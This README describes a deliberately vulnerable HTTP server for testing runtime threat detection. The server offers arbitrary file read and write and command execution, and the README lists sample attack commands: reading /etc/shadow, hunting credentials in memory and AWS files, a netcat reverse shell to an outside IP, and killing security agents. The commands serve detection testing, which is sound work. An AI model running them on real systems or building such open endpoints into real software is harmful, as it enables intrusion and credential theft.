# Security Playground

The security playground is a HTTP web server that alllows you to simulate various security breaches in runtime.

## Installation

Use the deployment.yaml to deploy this to your kubernetes cluster, it will deploy
- Deployment with 1 Replica of the pod
- LoadBalancer Service to expose the web server on port 80/HTTP

```bash
kubectl apply -f kubernetes-manifests/deployment.yaml
```

Or run it locally in using docker

```bash
docker run --rm -p 8080:8080 ghcr.io/andrewd-sysdig/security-playground:latest
```

## Usage

The HTTP API exposes three endpoints to interact with the system.

### Reading a file

You can read a file using just the URL. This will return the content of the /etc/shadow file.

```bash
curl http://<webserver>/etc/shadow
```

### Writing a file

You can write to a file using the URL and POSTing the content. This will write to /bin/hello the hello-world string.

```bash
curl -X POST http://<webserver>/bin/hello -d 'content=hello-world'
```

### Executing a command

You can execute a command using the /exec endpoint and POSTing the command. This will capture and return the STDOUT of the command executed.

```bash
curl -X POST http://<webserver>/exec -d 'command=ls -la'
```

## Library of curl commands to trigger various Sysdig Events

Set the WEBSERVERIP env variable to be the IP of your target (the pod/service)

```bash
export WEBSERVERIP=192.168.1.15
```

### Sysdig Managed Policy: Sysdig Runtime Threat Detection (Severity: High)

**Sysdig Event:** Reconnaissance attempt to find SUID binaries
**Command:**
```
curl -X POST http://$WEBSERVERIP/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'
```
**Sysdig Event:** Dump memory for credentials
**Command:**
```
curl -X POST http://$WEBSERVERIP/exec -d 'command=grep passwd /proc/1/mem'
```
**Sysdig Event:** Find AWS Credentials
**Command:**
```
curl -X POST http://$WEBSERVERIP/exec -d 'command=grep aws_access_key_id /tmp/'
```
**Sysdig Event:** Netcat Remote Code Execution in Contianer
**Command:**
```
curl -X POST http://$WEBSERVERIP/exec -d 'command=nc -c bash 10.0.0.1 4242'
```

**Sysdig Event:** Tampering with Security Software in Container
**Command:**
```
curl -X POST http://$WEBSERVERIP/exec -d 'command=pkill aliyun-service'
```

### Sysdig Managed Policy: Sysdig Runtime Notable Events (Severity: Medium)

**Sysdig Event:** Read sensitive file untrusted 
**Command:**
```
curl http://$WEBSERVERIP/etc/shadow
```